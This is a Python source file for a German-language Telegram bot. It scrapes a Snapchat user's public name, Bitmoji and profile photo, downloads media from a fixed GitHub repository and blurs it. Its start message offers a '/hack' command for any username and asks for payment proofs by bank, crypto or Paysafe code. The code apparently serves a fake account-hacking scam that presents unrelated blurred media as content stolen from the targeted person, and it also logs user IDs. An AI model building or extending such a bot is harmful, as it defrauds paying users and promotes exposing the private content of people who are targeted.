import os
import subprocess
from threading import Thread
from pathlib import Path
from random import sample, randint
from flask import Flask
import asyncio
import re
import requests
from bs4 import BeautifulSoup
from PIL import Image, ImageFilter
import urllib.request
import zipfile
import json
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    ContextTypes,
    MessageHandler,
    filters,
)
from telegram.constants import ParseMode

# 📂 Datei für gespeicherte User
USERS_FILE = "users.txt"

# ✅ Umgebungsvariablen laden
TOKEN = os.getenv("TOKEN")
CHANNEL_ID = os.getenv("CHANNEL_ID")
ADMIN_CHAT_ID = os.getenv("ADMIN_CHAT_ID")

if not TOKEN:
    raise ValueError("❌ Umgebungsvariable 'TOKEN' fehlt!")
if not CHANNEL_ID or not ADMIN_CHAT_ID:
    raise ValueError("❌ 'CHANNEL_ID' oder 'ADMIN_CHAT_ID' fehlt!")

CHANNEL_ID = int(CHANNEL_ID)
ADMIN_CHAT_ID = int(ADMIN_CHAT_ID)

# 🗂️ Ordner für Videos und Bilder einrichten
BASE = Path(__file__).parent
IMAGE_DIR = BASE / "images"   # JPG/PNG hinein
VIDEO_DIR = BASE / "videos"   # MP4 hinein
TEMP_DIR  = BASE / "temp"     # Output
PROFILE_DIR = BASE / "profiles"  # Für Bitmoji und Profilbilder

for p in (IMAGE_DIR, VIDEO_DIR, TEMP_DIR, PROFILE_DIR):
    p.mkdir(exist_ok=True, parents=True)

# 📥 GitHub Media Downloader (Render-optimiert)
def download_github_media():
    """Downloads images and videos from GitHub repository"""
    github_api_base = "https://api.github.com/repos/Ayman5552/snap/contents"

    # Check if we already have media (avoid re-download)
    imgs = [f for f in IMAGE_DIR.glob("*.*") if f.suffix.lower() in ('.jpg', '.jpeg', '.png', '.gif', '.webp') and f.name != '.gitkeep']
    vids = [f for f in VIDEO_DIR.glob("*.*") if f.suffix.lower() in ('.mp4', '.mov', '.avi') and f.name != '.gitkeep']

    if len(imgs) >= 5 and len(vids) >= 5:
        print(f"✅ Media bereits vorhanden: {len(imgs)} Bilder, {len(vids)} Videos")
        return True

    print("📥 Lade Media von GitHub...")

    # Download images
    try:
        img_response = requests.get(f"{github_api_base}/Images", timeout=30)
        if img_response.status_code == 200:
            images = img_response.json()
            print(f"📥 Lade {len(images)} Bilder von GitHub...")

            for img in images[:10]:  # Limit to prevent timeouts
                if img['name'].lower().endswith(('.jpg', '.jpeg', '.png', '.gif', '.webp')):
                    img_path = IMAGE_DIR / img['name']
                    if not img_path.exists():
                        try:
                            urllib.request.urlretrieve(img['download_url'], img_path)
                            print(f"✅ {img['name']} heruntergeladen")
                        except Exception as e:
                            print(f"❌ Fehler beim Download {img['name']}: {e}")
    except Exception as e:
        print(f"⚠️ Fehler beim Laden der Bilder: {e}")

    # Download videos  
    try:
        vid_response = requests.get(f"{github_api_base}/videos", timeout=30)
        if vid_response.status_code == 200:
            videos = vid_response.json()
            print(f"📥 Lade {len(videos)} Videos von GitHub...")

            for vid in videos[:5]:  # Limit to prevent timeouts
                if vid['name'].lower().endswith(('.mp4', '.mov', '.avi')):
                    vid_path = VIDEO_DIR / vid['name']
                    if not vid_path.exists():
                        try:
                            urllib.request.urlretrieve(vid['download_url'], vid_path)
                            print(f"✅ {vid['name']} heruntergeladen")
                        except Exception as e:
                            print(f"❌ Fehler beim Download {vid['name']}: {e}")
    except Exception as e:
        print(f"⚠️ Fehler beim Laden der Videos: {e}")

    print(f"🎯 Media-Download abgeschlossen!")
    return True

# 🎛️ Blur-Einstellungen
BLUR_IMAGE_RADIUS = 28
VIDEO_BLUR_SIGMA = 36

# ---- Webserver (Render Alive) ----
app = Flask('')

@app.route('/')
def home():
    return "I'm alive"

def keep_alive():
    port = int(os.environ.get("PORT", 5000))
    Thread(target=lambda: app.run(host='0.0.0.0', port=port)).start()

# ---- Speicher für einmalige Beweise ----
user_proof_sent = set()
user_content_counts = {}  # Store generated counts per user

# ---- Video/Bild Verarbeitung ----
def censor_image(input_path: Path, output_path: Path):
    """Zensiert ein Bild mit Gaussian Blur"""
    try:
        im = Image.open(input_path).convert("RGB")
        im = im.filter(ImageFilter.GaussianBlur(BLUR_IMAGE_RADIUS))
        im.save(output_path, format="JPEG", quality=90)
        return True
    except Exception as e:
        print(f"❌ Fehler beim Zensieren von {input_path}: {e}")
        return False

def check_ffmpeg():
    """Check if ffmpeg is available"""
    try:
        subprocess.run(['ffmpeg', '-version'], capture_output=True, check=True)
        return True
    except (subprocess.CalledProcessError, FileNotFoundError):
        return False

def censor_video(input_path: Path, output_path: Path):
    """Zensiert ein Video mit ffmpeg Gaussian Blur"""
    if not check_ffmpeg():
        print("❌ ffmpeg nicht verfügbar")
        return False

    vf = f"gblur=sigma={VIDEO_BLUR_SIGMA}"
    cmd = [
        "ffmpeg", "-y",
        "-i", str(input_path),
        "-vf", vf,
        "-c:v", "libx264", "-preset", "veryfast", "-crf", "28",
        "-an",
        str(output_path),
    ]
    print("➡️ ffmpeg:", " ".join(cmd))
    try:
        subprocess.run(cmd, check=True, capture_output=True, text=True)
        print("✅ ffmpeg OK:", output_path)
        return True
    except subprocess.CalledProcessError as e:
        print("❌ ffmpeg Fehler:", e.stderr)
        return False

# ---- Enhanced Snapchat Scraping with Bitmoji and Profile Photo ----
def extract_snapchat_profile_data(username: str):
    """Enhanced function to extract name, Bitmoji, and profile photo from Snapchat"""
    url = f"https://www.snapchat.com/@{username}"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    }

    try:
        resp = requests.get(url, headers=headers, timeout=15)
        if resp.status_code == 200:
            if "Sorry, this account doesn't exist." in resp.text or "Not Found" in resp.text:
                return False, None, None, None

            soup = BeautifulSoup(resp.text, "html.parser")

            # Extract display name
            name = None
            title = soup.find("title")
            if title:
                text = title.text.strip()
                name = text.split("(")[0].strip()
            else:
                name = username

            # Extract Bitmoji
            bitmoji_url = None
            # Look for Bitmoji in various possible locations
            bitmoji_elements = soup.find_all(['img', 'picture', 'source'], 
                                           attrs={'src': re.compile(r'.*bitmoji.*', re.I)})
            for elem in bitmoji_elements:
                src_value = elem.get('src') if hasattr(elem, 'get') else None
                if src_value:
                    bitmoji_url = str(src_value)
                    break

            # Also check for data-src attributes
            if not bitmoji_url:
                bitmoji_elements = soup.find_all(['img', 'picture', 'source'], 
                                               attrs={'data-src': re.compile(r'.*bitmoji.*', re.I)})
                for elem in bitmoji_elements:
                    data_src = elem.get('data-src') if hasattr(elem, 'get') else None
                    if data_src:
                        bitmoji_url = str(data_src)
                        break

            # Extract profile photo
            profile_photo_url = None
            # Look for profile pictures
            profile_elements = soup.find_all(['img'], 
                                           attrs={'src': re.compile(r'.*(profile|avatar|user).*\.(jpg|jpeg|png|webp)', re.I)})
            for elem in profile_elements:
                src_attr = elem.get('src') if hasattr(elem, 'get') else None
                if src_attr and 'bitmoji' not in str(src_attr).lower():
                    profile_photo_url = str(src_attr)
                    break

            # Alternative: look for meta tags with profile images
            if not profile_photo_url:
                meta_image = soup.find('meta', property='og:image')
                if meta_image:
                    content = meta_image.get('content') if hasattr(meta_image, 'get') else None
                    if content and 'bitmoji' not in str(content).lower() and any(ext in str(content).lower() for ext in ['.jpg', '.jpeg', '.png', '.webp']):
                        profile_photo_url = str(content)

            return True, name, bitmoji_url, profile_photo_url
        else:
            return False, None, None, None
    except Exception as e:
        print("Fehler beim erweiterten Abruf von Snapchat:", e)
        return False, None, None, None

def download_image(url: str, filename: str) -> bool:
    """Download an image from URL and save it"""
    if not url:
        return False

    # Sanitize filename for security
    import re
    clean_filename = re.sub(r'[^\w\-_\.]', '_', filename)
    if not clean_filename or '..' in clean_filename:
        clean_filename = f"profile_{hash(filename) % 10000}.jpg"

    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        }
        response = requests.get(url, headers=headers, timeout=10)
        if response.status_code == 200:
            filepath = PROFILE_DIR / clean_filename
            with open(filepath, 'wb') as f:
                f.write(response.content)
            return True
    except Exception as e:
        print(f"❌ Fehler beim Download von {url}: {e}")
    return False

# ---- Backward compatibility function ----
def check_snapchat_username_exists_and_get_name(username: str):
    """Backward compatibility - returns only exists status and name"""
    exists, name, _, _ = extract_snapchat_profile_data(username)
    return exists, name

async def send_content_to_user(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int, n_img: int, n_vid: int):
    """Disabled: This function no longer sends preview images/videos to users.
    It only informs the user that media delivery is gated behind payment/proof.
    """
    # Informational message only - no previews or media are sent.
    await context.bot.send_message(
        chat_id=user_id,
        text=(
            "🔒 Medien-Preview ist deaktiviert.\n\n"
            "Um Zugriff auf alle (legitimen) Inhalte zu erhalten, nutze bitte die offiziellen Zahlungswege (/pay) oder kontaktiere den Admin."
        )
    )
    return

# ---- START ----
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    uid = user.id
    uname = user.username or ""

    with open(USERS_FILE, "a", encoding="utf-8") as f:
        f.write(f"{uid} {uname}\n")

    text = (
        "🌟 Bitte Join zuerst den Kanal, um den Bot zu Nutzen ! 🌟\n\n"
        "👉t.me/+QT6ghV4v5rZjNmQx\n\n"
        "📢 Nach dem Beitritt kannst du sofort starten:\n"
        "/hack Benutzername von dem Account. \n\n"
        "Kunden-Bewertung (https://t.me/+qICdaAr6lE4yMzZh) \n\n"
        "Schicke Beweise für Zahlungen (Bank & Crypto als Foto, Paysafe als Code) direkt hier im Chat."
    )
    await update.message.reply_text(text)

# ---- ADMIN: /listusers ----
async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_CHAT_ID:
        return

    if not os.path.exists(USERS_FILE):
        await update.message.reply_text("Noch keine Nutzer gespeichert.")
        return

    with open(USERS_FILE, "r", encoding="utf-8") as f:
        data = f.read().strip()

    if not data:
        await update.message.reply_text("Noch keine Nutzer gespeichert.")
    else:
        await update.message.reply_text(f"📋 Gespeicherte Nutzer:\n\n{data}")
